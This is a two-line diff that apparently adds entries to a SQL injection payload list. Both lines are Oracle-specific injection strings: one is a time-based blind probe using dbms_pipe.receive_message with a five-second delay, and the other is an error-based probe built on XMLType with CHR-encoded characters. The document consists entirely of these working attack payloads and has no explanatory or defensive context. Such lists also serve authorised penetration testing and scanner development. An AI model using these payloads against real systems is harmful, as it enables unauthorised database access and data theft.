@@ -1,0 +1,2 @@
+' AND dbms_pipe.receive_message(('a'),5)=0--
+' AND UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(58))) IS NOT NULL--
